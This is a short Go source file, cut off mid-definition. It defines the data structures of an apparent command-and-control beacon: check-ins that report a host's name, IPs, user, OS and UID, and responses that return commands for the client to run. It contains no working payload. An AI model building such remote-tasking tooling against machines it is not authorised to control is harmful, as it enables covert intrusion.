package communication

import (
	"net"
	"sync"
	"time"

	"golang.org/x/crypto/ssh"
)

// BeaconResponse struct which contains
// an array of users
type BeaconResponse struct {
	Commands []Command `json:"Commands"`
}

// Command struct which contains
// an command and arguments
type Command struct {
	Command string   `json:"Command"`
	Args    []string `json:"Args"`
}

// Beacon - a structure that is received from client
type Beacon struct {
	Hostname    string   `json:"Hostname"`
	InternalIPS []string `json:"InternalIPS"`
	CurrentUser string   `json:"CurrentUser"`
	OS          string   `json:"OS"`
	UID         string   `json:"UID"`
	Sleeptime   int      `json:"Sleeptime"`
}

// Client is record that gets saved for each client
type Client struct {
	Beacon       Beacon 